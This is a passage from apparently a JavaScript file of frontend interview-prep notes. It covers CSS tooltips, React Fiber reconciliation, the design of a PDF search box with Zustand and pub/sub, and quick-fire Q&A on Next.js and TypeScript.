 * WHY visibility: hidden OVER display: none?
 * display: none removes the element from layout — you can't transition it.
 * visibility: hidden hides it but keeps its space — you CAN transition opacity with it.
 * Use: visibility + opacity together for accessible, animatable tooltips.
 *
 * WHY NOT opacity: 0 ALONE?
 * opacity: 0 hides visually but the element is still interactive (can receive clicks).
 * Pair with pointer-events: none to make it truly inert when hidden.
 *
 * POSITIONING:
 * The trigger is position: relative — creates containing block.
 * The tooltip is position: absolute — sits relative to the trigger.
 * Use transform: translateX(-50%) to center the tooltip regardless of its width.
 *
 * ACCESSIBILITY NOTE:
 * Pure CSS tooltips are NOT accessible — screen readers won't announce them on focus.
 * For production, use role="tooltip" + aria-describedby + show on :focus-visible too.
 * The CSS-only version is acceptable for decorative hints, not critical information.
 */

/*
HTML:
<button class="tooltip-trigger" aria-describedby="tip1">
  Hover me
  <span class="tooltip" id="tip1" role="tooltip">
    This is the tooltip text
  </span>
</button>

CSS:
.tooltip-trigger {
  position: relative;
  display: inline-flex;
  align-items: center;
}

.tooltip {
  /* Hidden state */
  position: absolute;
  bottom: calc(100% + 8px);   /* 8px gap above the trigger */
  left: 50%;
  transform: translateX(-50%); /* center horizontally */

  /* Styling */
  background: #1a1a2e;
  color: #fff;
  font-size: 0.8rem;
  white-space: nowrap;
  padding: 6px 10px;
  border-radius: 4px;
  pointer-events: none;  /* don't steal hover from trigger */

  /* Transition */
  opacity: 0;
  visibility: hidden;
  transition: opacity 0.2s ease, visibility 0.2s ease;
}

/* Arrow (pure CSS triangle using border trick) */
.tooltip::after {
  content: '';
  position: absolute;
  top: 100%;          /* sits just below the tooltip box */
  left: 50%;
  transform: translateX(-50%);
  border: 5px solid transparent;
  border-top-color: #1a1a2e; /* only top border is colored → downward triangle */
}

/* Show on hover OR keyboard focus (accessibility) */
.tooltip-trigger:hover .tooltip,
.tooltip-trigger:focus-visible .tooltip {
  opacity: 1;
  visibility: visible;
}

/* VARIANT: tooltip on the right side */
.tooltip--right {
  bottom: auto;
  left: calc(100% + 8px);
  top: 50%;
  transform: translateY(-50%);
}
.tooltip--right::after {
  top: 50%;
  left: 0;
  transform: translate(-100%, -50%);
  border-top-color: transparent;
  border-right-color: #1a1a2e; /* points left */
}
*/

/**
 * KEY CONCEPTS IN THIS PATTERN:
 * 1. position: relative on trigger — creates the coordinate system for absolute child
 * 2. position: absolute on tooltip — positions relative to trigger
 * 3. bottom: calc(100% + 8px) — places tooltip above trigger with a gap
 * 4. transform: translateX(-50%) — true centering (50% of tooltip's own width)
 * 5. visibility + opacity together — animatable AND removes interactivity when hidden
 * 6. pointer-events: none — tooltip doesn't intercept mouse events when hidden
 * 7. ::after with border trick — CSS triangle (no image/SVG needed)
 * 8. :focus-visible — keyboard users also get the tooltip (partial a11y fix)
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "I use visibility + opacity together — visibility alone can't be transitioned"
 * - "pointer-events: none prevents the hidden tooltip from stealing hover events"
 * - "transform: translateX(-50%) centers the tooltip regardless of its text width"
 * - "The CSS triangle uses the border trick — transparent borders + one colored border"
 * - "I also show it on :focus-visible for keyboard users — pure CSS a11y improvement"
 * - "For production I'd add role=tooltip and aria-describedby for screen readers"
 */


// ── 31. REACT FIBER & RECONCILIATION ─────────────────────────
/**
 * ─── WHAT IS REACT FIBER? ───
 *
 * React Fiber is React's reconciliation engine, rewritten from scratch in React 16.
 * The OLD reconciler (React Stack) was synchronous and recursive:
 * once a render started, it ran to completion and COULD NOT be interrupted.
 * This caused frame drops — if rendering a complex tree took 100ms,
 * the browser couldn't handle user input or paint for that entire 100ms.
 *
 * Fiber rewrote reconciliation to be:
 * - INCREMENTAL: work is split into small units called "fibers"
 * - INTERRUPTIBLE: React can pause work, handle higher-priority work, then resume
 * - PRIORITIZED: different updates get different priorities
 * - RESUMABLE: paused work can be resumed, aborted, or restarted
 *
 * ─── WHAT IS A FIBER? ───
 *
 * A Fiber is a plain JavaScript object representing one unit of work.
 * Every React element (every component, every DOM element) has a corresponding
 * Fiber node. Together they form a "Fiber tree" — a linked list structure
 * (not a recursive tree), so React can walk it iteratively and pause at any node.
 *
 * Each Fiber node stores:
 * - type: what component/element it represents
 * - stateNode: the actual DOM node or class instance
 * - child, sibling, return (parent): links in the tree
 * - pendingProps, memoizedProps: new and previous props
 * - memoizedState: current state (hooks linked list lives here)
 * - effectTag: what DOM change needs to happen (INSERT, UPDATE, DELETE)
 * - lanes: the priority of pending work
 *
 * React maintains TWO fiber trees:
 * - Current tree: what's currently on screen
 * - Work-in-progress tree: the tree being built for the next render
 * After commit, they swap. This is the "double buffering" technique.
 *
 * ─── HOW RECONCILIATION WORKS (THE TWO PHASES) ───
 *
 * PHASE 1 — RENDER PHASE (async, interruptible):
 * React traverses the component tree and builds the work-in-progress fiber tree.
 * For each fiber node:
 * - Calls the component function (or render method)
 * - Diffs new output against the current fiber
 * - Marks what changed (effects: insert, update, delete)
 * This phase can be PAUSED and RESUMED. It produces no visible side effects.
 * React uses a scheduler to yield control back to the browser between units of work.
 *
 * PHASE 2 — COMMIT PHASE (synchronous, can't be interrupted):
 * Once the work-in-progress tree is fully built, React commits it to the real DOM.
 * Three sub-phases:
 * - Before mutation: runs getSnapshotBeforeUpdate, captures DOM state
 * - Mutation: applies all DOM changes (insert, update, delete nodes)
 * - Layout: runs useLayoutEffect, componentDidMount/Update synchronously
 * After this, the work-in-progress tree becomes the current tree.
 * useEffect callbacks are scheduled to run asynchronously after paint.
 *
 * ─── SCHEDULING & PRIORITIES (React's Lane Model) ───
 *
 * React assigns every update a "lane" — a priority level.
 * Higher-priority work interrupts lower-priority work.
 *
 * Priority levels (highest to lowest):
 * 1. SyncLane — immediate (legacy sync renders, flushSync)
 * 2. InputContinuousLane — user input (typing, clicking, dragging)
 * 3. DefaultLane — normal state updates (data fetching, etc.)
 * 4. TransitionLane — startTransition / useTransition (non-urgent UI updates)
 * 5. IdleLane — background work (prefetching, cleanup)
 *
 * HOW INTERRUPTION WORKS:
 * React scheduler gives each unit of work a time slice (~5ms).
 * After each fiber is processed, React checks: "is there higher priority work waiting?"
 * If yes → pause current work, handle the urgent work, then resume.
 * The paused work-in-progress tree is kept in memory until React can continue.
 * If the paused work is now stale (a newer update came in for the same state),
 * React DISCARDS the old work-in-progress and starts fresh with the latest state.
 *
 * ─── BATCH UPDATES ───
 *
 * React 17 and earlier: batching only happened inside React event handlers.
 * If you called setState twice in a setTimeout or Promise, each caused a separate render.
 *
 * React 18 — Automatic Batching:
 * ALL setState calls are now batched by default, regardless of where they come from:
 * React event handlers, setTimeout, Promises, native event listeners — all batched.
 * Multiple state updates in one callback = ONE re-render with the final state.
 *
 * function handleClick() {
 *   setCount(c => c + 1);   // \
 *   setName('Alice');        //  → ONE re-render (batched)
 *   setLoading(false);       // /
 * }
 *
 * To opt OUT of batching (force immediate render): use flushSync(() => setState(...))
 *
 * ─── startTransition / useTransition ───
 *
 * Some updates are URGENT: typing in a search box must feel instant.
 * Some updates are NON-URGENT: filtering 50K rows to show results can wait.
 * Before Transitions, both had the same priority — the heavy filter blocked the typing.
 *
 * startTransition(() => {
 *   setSearchResults(filterData(query)); // non-urgent
 * });
 * setQuery(value); // urgent — happens immediately
 *
 * React renders the urgent update first. The transition update is rendered with
 * lower priority. If a NEW urgent update comes in while the transition is rendering,
 * React ABANDONS the in-progress transition and starts fresh.
 * The UI always stays responsive for urgent work.
 *
 * useTransition() returns [isPending, startTransition].
 * isPending = true while transition is still rendering → show a loading indicator.
 *
 * useDeferredValue(value):
 * Similar concept but for values, not setters.
 * Returns a deferred copy of the value that lags behind.
 * Use when you can't wrap the state setter (e.g., prop from parent).
 *
 * ─── DIFFING ALGORITHM — KEY RULES ───
 *
 * React's diff makes two assumptions to keep it O(n) instead of O(n³):
 * 1. Different element TYPES produce completely different trees.
 *    If <div> changes to <span>, React destroys the old subtree and builds fresh.
 * 2. Keys identify stable elements across renders.
 *    key="user-123" tells React this is the same user, even if position changed.
 *    Without keys in lists, React matches by index — causes wrong state on reorder.
 *
 * KEY RULES:
 * - Same type + same key → update the existing fiber (reconcile props)
 * - Same type + different key → unmount old, mount new
 * - Different type → unmount entire subtree, mount new
 * - Keys must be STABLE and UNIQUE among siblings (not array index for dynamic lists)
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "Fiber rewrote React's reconciler to be incremental and interruptible"
 * - "Render phase is async and can be paused; commit phase is synchronous and can't"
 * - "React maintains two fiber trees: current (on screen) and work-in-progress (building)"
 * - "Lanes assign priorities — user input interrupts transitions which interrupt idle work"
 * - "React 18 automatic batching groups all state updates into one render"
 * - "startTransition marks updates as non-urgent — React can interrupt them for user input"
 * - "The diffing algorithm is O(n) because of two assumptions: type changes = full remount, keys identify stable nodes"
 * - "useTransition returns isPending — use it to show a loading state during transitions"
 */


// ── 32. SYSTEM DESIGN — PDF SEARCH BOX ───────────────────────
/**
 * PROBLEM STATEMENT:
 * Design a PDF viewer with a search box that:
 * - Searches for a keyword across the entire PDF
 * - Cycles through matches (next/previous) — pressing Enter loops from last match back to first
 * - Highlights all occurrences
 * - Shows "3 of 17 matches" indicator
 *
 * This is a frontend system design question. The interviewer wants to see:
 * architecture decisions, state management choice + justification, component breakdown,
 * performance thinking, and how different parts communicate.
 *
 * ─── STEP 1: CLARIFY REQUIREMENTS ───
 * Before designing, ask:
 * - Is the PDF rendered as canvas (PDF.js) or as extracted text in DOM?
 * - Real-time search (as you type) or only on Enter/submit?
 * - How large can PDFs be? (100 pages vs 5000 pages matters for performance)
 * - Highlight all matches at once, or only the current one?
 * - Keyboard shortcuts? (Ctrl+F behavior)
 * - Case-sensitive search?
 *
 * ─── STEP 2: COMPONENT ARCHITECTURE ───
 *
 * <PDFViewer>                    ← top-level container, owns search state
 *   <SearchBox />                ← input, next/prev buttons, match counter
 *   <PDFPageList>                ← virtualized list of pages
 *     <PDFPage pageNum={n} />   ← renders one page, highlights matches on it
 *   </PDFPageList>
 * </PDFViewer>
 *
 * ─── STEP 3: DATA FLOW & STATE ───
 *
 * Core state:
 * {
 *   query: string,              // current search term
 *   matches: Match[],           // [{pageNum, startIndex, endIndex, rect}, ...]
 *   currentMatchIndex: number,  // which match is "active" (highlighted differently)
 * }
 *
 * type Match = {
 *   pageNum: number;
 *   startIndex: number;   // character index in page text
 *   endIndex: number;
 *   rect: DOMRect;        // position for highlight overlay (if canvas-based)
 * }
 *
 * ─── STEP 4: STATE MANAGEMENT DECISION ───
 *
 * Option A — Local useState in <PDFViewer> (simplest, likely sufficient):
 * All search state lives in PDFViewer. Passed down as props or Context.
 * Good for: this feature is self-contained. No other part of the app needs it.
 * Drawback: if PDFViewer re-renders on every keystroke, all pages re-render too.
 * Fix: wrap PDFPage in React.memo, pass stable callbacks via useCallback.
 *
 * Option B — React Context + useReducer (good for medium complexity):
 * SearchContext provides {query, matches, currentIndex, dispatch}.
 * Pages subscribe only to what they need via context selectors (use-context-selector lib).
 * Good for: keeping PDFViewer clean, sharing search state with a toolbar in a different subtree.
 * Drawback: vanilla Context re-renders ALL consumers — need use-context-selector or splitting.
 *
 * Option C — Zustand (recommended for production):
 * const useSearchStore = create((set, get) => ({
 *   query: '',
 *   matches: [],
 *   currentIndex: 0,
 *   setQuery: (q) => set({ query: q }),
 *   setMatches: (m) => set({ matches: m, currentIndex: 0 }),
 *   next: () => set(s => ({ currentIndex: (s.currentIndex + 1) % s.matches.length })),
 *   prev: () => set(s => ({ currentIndex: (s.currentIndex - 1 + s.matches.length) % s.matches.length })),
 * }));
 * Benefits:
 * - Components subscribe to SLICES — only re-render when their slice changes
 * - No Provider boilerplate, no prop drilling
 * - Devtools support, easy to test
 * - PDFPage subscribes to `matches.filter(m => m.pageNum === n)` — only re-renders when ITS page's matches change
 *
 * Option D — Redux Toolkit (for large teams, complex flows):
 * Overkill for this feature alone, but if the app already uses Redux:
 * createSlice({ name: 'search', initialState, reducers: { setQuery, setMatches, next, prev } })
 * RTK Query if matches come from a server (PDF search API).
 * Benefits: strict unidirectional data flow, time-travel debugging, middleware (analytics).
 * Drawback: boilerplate, over-engineered for this scope.
 *
 * Option E — MobX (reactive, less common in new projects):
 * Observable state, computed values, reactions.
 * MobX automatically tracks what each component accesses and re-renders only those.
 * class SearchStore { @observable query = ''; @computed get matchCount() {...} }
 * More magic, harder to trace data flow, not recommended for new projects unless team knows it.
 *
 * RECOMMENDATION: useState/useReducer for a contained feature.
 * Zustand if search state is needed across multiple areas of the app.
 * Redux Toolkit only if you're already using it.
 *
 * ─── STEP 5: SEARCH ALGORITHM ───
 *
 * On query change (debounced, ~300ms):
 * 1. Extract text content from each page (PDF.js provides page.getTextContent())
 * 2. Run case-insensitive indexOf / regex search on each page's text
 * 3. Build matches array with {pageNum, startIndex, endIndex}
 * 4. Store matches in state, reset currentIndex to 0
 *
 * Optimization for large PDFs:
 * - Run search in a Web Worker — don't block the main thread
 * - Search pages lazily (search visible pages first, then background)
 * - Use startTransition for updating matches — keeps search input responsive
 *
 * // Web Worker approach:
 * const worker = new Worker('./search.worker.js');
 * worker.postMessage({ pages: extractedTexts, query });
 * worker.onmessage = (e) => startTransition(() => setMatches(e.data));
 *
 * ─── STEP 6: CYCLING LOGIC ───
 *
 * next() → currentIndex = (currentIndex + 1) % matches.length
 * prev() → currentIndex = (currentIndex - 1 + matches.length) % matches.length
 * The modulo wraps around automatically — last match → next() → first match.
 *
 * When currentIndex changes:
 * - Scroll the active match into view (scrollIntoView({ behavior: 'smooth', block: 'center' }))
 * - If the page isn't rendered yet (virtualized), scroll to that page first, then highlight
 *
 * ─── STEP 7: HIGHLIGHTING ───
 *
 * For DOM-based PDF rendering:
 * - Wrap matched text in <mark> elements with CSS highlight styling
 * - Active match gets a different color (e.g., orange vs yellow)
 *
 * For Canvas-based rendering (PDF.js):
 * - Draw semi-transparent rectangles over the canvas at match coordinates
 * - PDF.js provides text layer with absolute-positioned <span>s — can highlight those
 * - Or use the canvas 2D context: ctx.fillStyle = 'rgba(255,255,0,0.4)'; ctx.fillRect(...)
 *
 * ─── STEP 8: PERFORMANCE ───
 *
 * Virtualize the page list — only render visible pages (react-window or TanStack Virtual).
 * Don't highlight on every keypress — debounce by 300ms.
 * Web Worker for the search computation.
 * React.memo on PDFPage — only re-render pages whose matches changed.
 * Zustand slice subscription — PDFPage only watches its own page's matches.
 *
 * ─── PUB/SUB PATTERN (mentioned in the interview) ───
 *
 * Pub/Sub (Publisher/Subscriber) is a messaging pattern where:
 * - Publishers emit events (they don't know who's listening)
 * - Subscribers listen for events (they don't know who published)
 * - A central event bus decouples them
 *
 * In this PDF context:
 * SearchBox PUBLISHES: { type: 'SEARCH', query: 'contract' }
 * PDFPage SUBSCRIBES: to SEARCH events, filters its matches, re-highlights
 * Useful when the component tree makes prop drilling awkward.
 *
 * Simple event emitter:
 * class EventBus {
 *   #listeners = new Map();
 *   on(event, fn) {
 *     if (!this.#listeners.has(event)) this.#listeners.set(event, new Set());
 *     this.#listeners.get(event).add(fn);
 *     return () => this.#listeners.get(event).delete(fn); // returns unsubscribe
 *   }
 *   emit(event, data) {
 *     this.#listeners.get(event)?.forEach(fn => fn(data));
 *   }
 * }
 * export const bus = new EventBus();
 *
 * In React though: Context, Zustand, or Redux are cleaner than a raw event bus.
 * Pub/Sub is more useful for: micro-frontends, cross-app communication,
 * or integrating with non-React parts of the page.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "I'd start with local state — the feature is self-contained, no need for global store"
 * - "Zustand is my go-to when state is needed across distant parts of the tree — no Provider boilerplate, fine-grained subscriptions"
 * - "I'd debounce the search input by 300ms and run the search in a Web Worker to keep the UI responsive"
 * - "Cycling uses modulo: (index + 1) % matches.length — wraps automatically"
 * - "startTransition on match updates — keeps the search input instant while results compute in background"
 * - "Pub/Sub decouples publishers and subscribers but Context or Zustand is cleaner in React"
 * - "For canvas-based PDFs, I'd use PDF.js text layer spans for highlighting — overlay on canvas"
 * - "Virtualize the page list — only render visible pages regardless of PDF size"
 */

// Zustand store for PDF search (concise implementation):
/*
import { create } from 'zustand';

const usePDFSearch = create((set, get) => ({
  query: '',
  matches: [],       // [{ pageNum, startIndex, endIndex }]
  activeIndex: 0,

  setQuery: (query) => set({ query }),

  setMatches: (matches) => set({ matches, activeIndex: 0 }),

  next: () => {
    const { activeIndex, matches } = get();
    set({ activeIndex: (activeIndex + 1) % matches.length });
  },

  prev: () => {
    const { activeIndex, matches } = get();
    set({ activeIndex: (activeIndex - 1 + matches.length) % matches.length });
  },

  activeMatch: () => {
    const { matches, activeIndex } = get();
    return matches[activeIndex] ?? null;
  },
}));
*/

// Simple EventBus (Pub/Sub):
class EventBus {
  #listeners = new Map();

  on(event, fn) {
    if (!this.#listeners.has(event)) this.#listeners.set(event, new Set());
    this.#listeners.get(event).add(fn);
    return () => this.#listeners.get(event).delete(fn); // cleanup fn
  }

  emit(event, data) {
    this.#listeners.get(event)?.forEach(fn => fn(data));
  }

  off(event, fn) {
    this.#listeners.get(event)?.delete(fn);
  }
}
// export const bus = new EventBus();
// const unsub = bus.on('search', ({ query }) => highlightPage(query));
// bus.emit('search', { query: 'contract' });
// cleanup: unsub() in useEffect return


// ==============================================================
// ⚡ NEXT.JS — 16 QUICK-FIRE INTERVIEW Q&A
// ==============================================================

/**
 * Q1. What is the App Router vs Pages Router?
 * - Pages Router (legacy): files in /pages → automatic routes. Uses getServerSideProps / getStaticProps.
 * - App Router (Next 13+): files in /app. Uses React Server Components by default.
 *   Every file is a Server Component unless you add "use client" at the top.
 *   Supports nested layouts, streaming, and server actions out of the box.
 *
 * 🗣️ "App Router is the new default — Server Components by default, 'use client' opts into the client bundle."
 *
 *
 * Q2. What does "use client" do?
 * - Marks a component (and everything it imports) as a Client Component.
 * - Client Components run in the browser — they can use useState, useEffect,
 *   onClick, browser APIs, etc.
 * - Server Components CAN render Client Components, but Client Components
 *   CANNOT import Server Components (only pass them as props/children).
 * - Put "use client" as LOW as possible in the tree to keep most code on the server.
 *
 * 🗣️ "use client creates a boundary — everything below it ships to the browser.
 *      Push it down as far as possible to minimise client bundle size."
 *
 *
 * Q3. What does "use server" do?
 * - Marks a function as a Server Action — an async function that runs on the server
 *   and can be called directly from a form action or a client event handler.
 * - No separate API route needed. Form data is sent via a POST automatically.
 *
 * // app/actions.ts
 * "use server"
 * export async function submitForm(formData: FormData) {
 *   const name = formData.get('name');
 *   await db.save({ name });
 * }
 *
 * 🗣️ "Server Actions replace simple API routes — less boilerplate, type-safe, RPC-style."
 *
 *
 * Q4. How is the /app directory structured?
 *
 * app/
 * ├── layout.tsx          ← Root layout (wraps every page, never re-mounts)
 * ├── page.tsx            ← Route: /
 * ├── loading.tsx         ← Shown while page.tsx is streaming
 * ├── error.tsx           ← Error boundary for this segment ("use client")
 * ├── not-found.tsx       ← Shown when notFound() is called
 * ├── template.tsx        ← Like layout but RE-MOUNTS on navigation
 * ├── global-error.tsx    ← Catches errors in root layout
 * ├── dashboard/
 * │   ├── layout.tsx      ← Nested layout (only wraps /dashboard/*)
 * │   └── page.tsx        ← Route: /dashboard
 * └── api/
 *     └── users/
 *         └── route.ts    ← API route: GET/POST /api/users
 *
 * 🗣️ "Layouts persist across navigation — no re-mount, shared state survives."
 *
 *
 * Q5. layout.tsx vs template.tsx?
 * - layout.tsx: persists across child route changes, does NOT re-render/re-mount.
 *   Good for sidebars, nav, persistent UI.
 * - template.tsx: same wrapping behaviour but RE-MOUNTS on every navigation.
 *   Good for page enter animations, resetting state between routes.
 *
 * 🗣️ "Layout = persistent shell. Template = fresh mount every navigation."
 *
 *
 * Q6. What is a Server Component? What can't it do?
 * - Renders on the server only. No JS shipped to the browser for this component.
 * - CAN: fetch data directly (async/await), access filesystem, DB, env secrets.
 * - CANNOT: use useState, useEffect, useContext, onClick, or any browser API.
 * - Default in App Router — every component is a Server Component unless "use client".
 *
 * 🗣️ "Server Components = zero client bundle cost. They're like PHP templates but with React's composability."
 *
 *
 * Q7. How do you fetch data in the App Router?
 * - In Server Components: plain async/await fetch(). Next.js extends fetch with
 *   caching options: { cache: 'force-cache' } (static), { next: { revalidate: 60 } } (ISR),
 *   { cache: 'no-store' } (SSR every request).
 * - In Client Components: useEffect + fetch, SWR, or React Query.
 * - For mutations: Server Actions.
 *
 * async function Page() {
 *   const data = await fetch('https://api.example.com/data', { next: { revalidate: 60 } });
 *   const json = await data.json();
 *   return <div>{json.title}</div>;
 * }
 *
 * 🗣️ "No getServerSideProps anymore — just async/await at the top of a Server Component."
 *
 *
 * Q8. What is Streaming / Suspense in Next.js?
 * - Server Components can STREAM HTML progressively using React Suspense.
 * - Wrap slow components in <Suspense fallback={<Spinner/>}> — the shell HTML
 *   is sent immediately, slow parts trickle in as they resolve.
 * - loading.tsx is a built-in Suspense boundary for a whole route segment.
 *
 * 🗣️ "Streaming means TTFB is fast — the shell arrives instantly, data fills in progressively."
 *
 *
 * Q9. What are Route Groups and Parallel Routes?
 * - Route Groups: wrap folders in (parentheses) → groups routes WITHOUT affecting the URL.
 *   Use case: share a layout among a subset of routes.
 *   app/(auth)/login/page.tsx → URL is still /login
 *
 * - Parallel Routes: @folder syntax. Render multiple pages in the same layout simultaneously.
 *   Example: dashboard with @analytics and @team panels that load independently.
 *
 * 🗣️ "Route groups let me share layouts without polluting the URL structure."
 *
 *
 * Q10. What is the difference between Static, SSR, and ISR in Next.js?
 *
 * | Mode    | When rendered        | How to opt in (App Router)              |
 * |---------|----------------------|-----------------------------------------|
 * | Static  | Build time           | fetch with cache: 'force-cache' (default)|
 * | SSR     | Every request        | fetch with cache: 'no-store'            |
 * | ISR     | After N seconds      | fetch with next: { revalidate: 60 }     |
 *
 * ISR = stale-while-revalidate at build/CDN level. Page serves cached HTML,
 * regenerates in background after revalidate seconds.
 *
 * 🗣️ "ISR gives me static performance with dynamic freshness — best of both worlds."
 *
 *
 * Q11. How does the Next.js Image component help?
 * - Automatically serves WebP/AVIF, resizes on-demand via the built-in image optimizer.
 * - Lazy loads by default, prevents CLS with width/height reservation.
 * - priority prop to preload above-the-fold images (LCP element).
 *
 * <Image src="/hero.jpg" width={800} height={400} alt="Hero" priority />
 *
 * 🗣️ "next/image eliminates the most common image perf mistakes automatically."
 *
 *
 * Q12. How do you handle metadata (SEO) in App Router?
 * - Export a metadata object or generateMetadata function from layout/page.
 * - No need for react-helmet or next/head anymore.
 *
 * // Static
 * export const metadata = { title: 'My App', description: 'Best app' };
 *
 * // Dynamic
 * export async function generateMetadata({ params }) {
 *   const product = await getProduct(params.id);
 *   return { title: product.name };
 * }
 *
 * 🗣️ "generateMetadata is async — you can fetch from DB and return fully dynamic SEO tags."
 *
 *
 * Q13. What is Middleware in Next.js?
 * - middleware.ts at the project root runs BEFORE the request hits a page/API.
 * - Runs on the Edge Runtime (fast, low-latency). Good for: auth checks, redirects,
 *   A/B testing, locale detection, rate limiting.
 *
 * // middleware.ts
 * import { NextResponse } from 'next/server';
 * export function middleware(request) {
 *   const token = request.cookies.get('token');
 *   if (!token) return NextResponse.redirect(new URL('/login', request.url));
 *   return NextResponse.next();
 * }
 * export const config = { matcher: ['/dashboard/:path*'] };
 *
 * 🗣️ "Middleware is my gate before any page loads — auth, redirects, AB tests all happen there."
 *
 *
 * Q14. What is the difference between next/link and a regular <a> tag?
 * - <Link> does client-side navigation — no full page reload.
 * - Prefetches the linked route in the background (on hover in production).
 * - Use <a> only for external links or when you need to leave the Next.js app.
 *
 * 🗣️ "Link prefetches and navigates client-side. Plain <a> triggers a full page reload."
 *
 *
 * Q15. How do you do dynamic routes and catch-all routes?
 * - Dynamic: app/products/[id]/page.tsx → /products/42
 * - Catch-all: app/docs/[...slug]/page.tsx → /docs/a/b/c (slug = ['a','b','c'])
 * - Optional catch-all: app/docs/[[...slug]]/page.tsx → also matches /docs
 * - generateStaticParams() pre-renders a list of dynamic params at build time.
 *
 * 🗣️ "generateStaticParams replaces getStaticPaths — same idea, cleaner API."
 *
 *
 * Q16. What are the main Next.js performance optimisations?
 * - Server Components → zero client JS for data-fetching components
 * - Streaming + Suspense → faster TTFB, progressive hydration
 * - next/image → WebP, lazy load, no CLS
 * - next/font → self-hosted fonts, no layout shift, no external request
 * - Route Prefetching → <Link> prefetches on hover
 * - Partial Prerendering (PPR, experimental) → static shell + dynamic holes in ONE request
 * - Middleware at the Edge → auth/redirects without hitting origin server
 *
 * 🗣️ "My default stack: Server Components for data, Suspense for streaming, next/image + next/font for assets, middleware for auth."
 */


// ==============================================================
// 🔷 TYPESCRIPT — QUICK-FIRE INTERVIEW Q&A
// ==============================================================

/**
 * Q1. type vs interface — what's the difference?
 *
 * interface:
 * - Can be EXTENDED with extends keyword (like a class)
 * - Supports DECLARATION MERGING — two interfaces with the same name merge automatically
 * - Best for object shapes, especially in public APIs / library types
 *
 * type:
 * - Can represent ANYTHING — unions, intersections, primitives, tuples, mapped types
 * - NO declaration merging
 * - Best for unions, utility types, complex computed types
 *
 * interface User { name: string; }
 * interface User { age: number; }  // ✅ merges — User now has name + age
 *
 * type User = { name: string; };
 * type User = { age: number; };    // ❌ Error: duplicate identifier
 *
 * type ID = string | number;       // ✅ Only type can do unions
 * type Coord = [number, number];   // ✅ Tuple
 *
 * 🗣️ "I use interface for object shapes and class contracts, type for unions and computed types.
 *      In practice they're almost interchangeable for simple objects."
 *
 *
 * Q2. What is the difference between unknown, any, and never?
 *
 * any     → turns off type checking entirely. Avoid it.
 * unknown → type-safe alternative to any. You must narrow it before using it.
 *           (typeof check, instanceof, type guard)
 * never   → a value that can NEVER exist.
 *           - Return type of functions that throw or infinite-loop
 *           - Bottom of exhaustive switch/if chains
 *
 * function parseJSON(raw: unknown) {
 *   if (typeof raw === 'string') return JSON.parse(raw); // narrowed ✅
 * }
 *
 * function fail(msg: string): never { throw new Error(msg); }
 *
 * 🗣️ "unknown is any with a seatbelt — you must prove the type before using it.
 *      never is what's left when all possibilities are exhausted."
 *
 *
 * Q3. What are generics? When do you use them?
 * - Generics let you write reusable code that works with MULTIPLE types
 *   while still being type-safe.
 *
 * function identity<T>(value: T): T { return value; }
 *
 * function first<T>(arr: T[]): T | undefined { return arr[0]; }
 *
 * interface ApiResponse<T> {
 *   data: T;
 *   status: number;
 *   error?: string;
 * }
 * // Usage: ApiResponse<User>, ApiResponse<Product[]>
 *
 * 🗣️ "Generics are like type parameters — they keep you DRY without losing type safety."
 *
 *
 * Q4. What are utility types? Name the most common ones.
 *
 * Partial<T>        → all properties optional
 * Required<T>       → all properties required
 * Readonly<T>       → all properties read-only
 * Pick<T, K>        → keep only keys K from T
 * Omit<T, K>        → remove keys K from T
 * Record<K, V>      → object with keys K and values V
 * Exclude<T, U>     → remove U from union T
 * Extract<T, U>     → keep only U from union T
 * NonNullable<T>    → remove null and undefined
 * ReturnType<T>     → get return type of a function
 * Parameters<T>     → get parameter types of a function as a tuple
 * Awaited<T>        → unwrap a Promise type
 *
 * type UpdateUser = Partial<Pick<User, 'name' | 'email'>>;
 *
 * 🗣️ "I reach for Partial on update DTOs, Omit to strip IDs from create payloads,
 *      Record for lookup maps."
 *
 *
 * Q5. What is a type guard?
 * - A function that NARROWS a type at runtime using a type predicate (value is Type).
 *
 * function isString(value: unknown): value is string {
 *   return typeof value === 'string';
 * }
 *
 * // Discriminated union guard (most common in React):
 * type Shape = { kind: 'circle'; radius: number } | { kind: 'square'; side: number };
 * function area(s: Shape) {
 *   if (s.kind === 'circle') return Math.PI * s.radius ** 2; // TS knows it's circle ✅
 *   return s.side ** 2;
 * }
 *
 * 🗣️ "Type guards tell TypeScript 'inside this if-block, trust me, the type is X'."
 *
 *
 * Q6. What is the difference between as and satisfies?
 *
 * as (type assertion) → FORCES the type. Bypasses checks. Can be wrong at runtime.
 * satisfies           → checks that the value MATCHES the type but KEEPS the inferred type.
 *                       Introduced in TS 4.9.
 *
 * const config = {
 *   port: 3000,
 *   host: 'localhost',
 * } satisfies Record<string, string | number>;
 * // config.port is still type `number` (not string | number) ✅
 * // TS still validates all keys match Record<string, string | number> ✅
 *
 * 🗣️ "'satisfies' validates without widening — you get both safety and precise inference."
 *
 *
 * Q7. What are mapped types?
 * - Transform every property of an existing type systematically.
 *
 * type Nullable<T> = { [K in keyof T]: T[K] | null };
 * type Flags<T>    = { [K in keyof T]: boolean };
 *
 * // Partial<T> is implemented as:
 * type Partial<T> = { [K in keyof T]?: T[K] };
 *
 * 🗣️ "Mapped types are like Array.map but for object shapes — transform every key programmatically."
 *
 *
 * Q8. What are conditional types?
 * - Types that choose between two types based on a condition.
 *
 * type IsString<T> = T extends string ? 'yes' : 'no';
 * type R1 = IsString<string>;  // 'yes'
 * type R2 = IsString<number>;  // 'no'
 *
 * // Unwrap a promise:
 * type Awaited<T> = T extends Promise<infer U> ? U : T;
 * type V = Awaited<Promise<string>>;  // string
 *
 * 🗣️ "Conditional types + infer let you extract and transform types at the meta level."
 *
 *
 * Q9. What is declaration merging?
 * - TypeScript merges multiple declarations of the SAME interface name into one.
 * - Useful for extending third-party types (module augmentation).
 *
 * // Extend Express Request to add a user property:
 * declare global {
 *   namespace Express {
 *     interface Request { user?: User; }
 *   }
 * }
 *
 * 🗣️ "Module augmentation lets me add custom fields to library types without forking them."
 *
 *
 * Q10. enum vs const enum vs union of string literals?
 *
 * enum Direction { Up, Down }
 * // Compiles to a real JS object. Can iterate over values. Adds runtime code.
 *
 * const enum Direction { Up, Down }
 * // Inlined at compile time — NO runtime object generated. Faster, smaller output.
 * // But: can't iterate, can cause issues with isolated modules / Babel.
 *
 * type Direction = 'up' | 'down';
 * // Pure TS. Zero runtime cost. Most flexible. Can't iterate easily.
 * // Preferred in most modern codebases.
 *
 * 🗣️ "I default to string literal unions — they're readable, have zero runtime cost,
